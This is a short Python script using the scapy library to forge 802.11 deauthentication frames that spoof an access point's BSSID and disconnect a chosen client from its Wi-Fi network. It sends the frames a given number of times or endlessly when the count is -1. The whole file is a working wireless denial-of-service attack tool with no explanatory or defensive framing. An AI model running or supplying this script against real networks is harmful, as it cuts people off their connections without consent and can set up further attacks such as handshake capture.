#!/usr/bin/python

import sys
import time
if len(sys.argv) != 5:
    print "%s <iface> <bssid> <client> <count>" % sys.argv[0]
    sys.exit(1)

from scapy.all import *
conf.verb = 0 #Shut up scapy
delay = 0.5

conf.iface = sys.argv[1]
bssid = sys.argv[2]
client = sys.argv[3]
count = int(sys.argv[4])

pkt = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)

if count == -1:
    while True:
        time.sleep(delay)
        try:
            send(pkt)
            print "Deauth pkt send via %s to BSSID: %s for Client: %s (inf)" % (conf.iface, bssid, client)
        except:
            pass
else:
    for n in range(count):
        time.sleep(delay)
        try:
            send(pkt)
            print "Deauth pkt send via %s to BSSID: %s for Client: %s (%d/%d)" % (conf.iface, bssid, client, n+1, count)
        except:
            pass
